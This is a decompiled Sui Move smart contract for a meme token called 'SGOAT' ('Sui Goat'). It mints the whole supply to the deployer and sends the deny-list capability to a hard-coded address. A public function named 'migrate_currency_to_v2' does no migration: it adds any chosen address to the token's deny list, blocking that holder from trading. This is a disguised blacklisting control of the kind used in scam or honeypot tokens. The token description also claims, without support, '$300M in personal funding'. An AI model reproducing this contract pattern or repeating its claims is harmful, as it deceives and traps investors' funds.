module 0x182fc066e7629bf9efa34e4fa1da1480e5c4809e3c1e34746e95841dcdf7165::sgoat {
    struct SGOAT has drop {
        dummy_field: bool,
    }

    public entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<SGOAT>, arg1: 0x2::coin::Coin<SGOAT>) {
        0x2::coin::burn<SGOAT>(arg0, arg1);
    }

    fun init(arg0: SGOAT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SGOAT>(arg0, 9, b"SGOAT", b"Sui Goat", b"sGOAT, is a meme token launched by the largest SUI , to create fun and increase interest on the SUI chain amidst the Solana meme's surge. $sGOAT is backed up with over $300M in personal funding from its founder and trading on Cetus.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://i.imgur.com/4q47ogD.png")), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<SGOAT>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SGOAT>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<SGOAT>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SGOAT>>(v1, @0x205a73ae26e7f30b557f761ac4370f82e3304a4fab9bbc95758cf2cf68256452);
    }

    public fun migrate_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SGOAT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SGOAT>(arg0, arg1, arg2, arg3);
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<SGOAT>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<SGOAT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

